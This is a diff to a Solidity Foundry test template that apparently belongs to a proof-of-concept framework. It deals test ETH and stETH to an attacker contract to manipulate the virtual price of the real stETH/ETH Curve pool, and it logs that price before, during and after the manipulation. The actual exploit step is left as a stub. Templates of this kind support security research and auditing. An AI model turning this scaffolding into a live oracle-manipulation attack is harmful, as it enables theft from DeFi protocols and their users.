@@ -6,29 +6,34 @@ import "./tokens/Tokens.sol";
 import "forge-std/console.sol";
 
 contract PriceManipulationTemplate is PriceManipulation, Tokens {
+    // stETH / ETH Curve pool
+    ICurvePool pool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
+    
     function initiateAttack() external {
-        // Take flash loan on some token
+        // In this example we are dealing ETH and stETH to an attacker to use for price manipulation
+        // of the stETH / ETH Curve pool. This allows us to manipulate the virtual price of the asset
+        // for an attack on a protocol which relies on the data from this oracle
         deal(EthereumTokens.NATIVE_ASSET, address(this), 50000e18);
         // Deal wstETH since forge deal cheatcode does not currently support stETH directly
         deal(EthereumTokens.wstETH, address(this), 50000e18);
         IWrapped(address(EthereumTokens.wstETH)).unwrap(50000e18);
-        console.log("Virtual price before:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
+        console.log("Virtual price before:", pool.get_virtual_price());
         manipulatePrice(PriceManipulationProviders.CURVE, EthereumTokens.ETH, EthereumTokens.stETH, 50000e18, 50000e18);
         _completeAttack();
     }
 
     function _executeAttack() internal override {
         // Execute attack and use flash loaned funds here
-        console.log("Virtual price during:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
+        console.log("Virtual price during:", pool.get_virtual_price());
     }
 
     function _completeAttack() internal override {
         // Finish attack
-        console.log("Virtual price after :", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
+        console.log("Virtual price after :", pool.get_virtual_price());
     }
 }
 
-interface IPool {
+interface ICurvePool {
     function get_virtual_price() external view returns (uint256);
 }
 
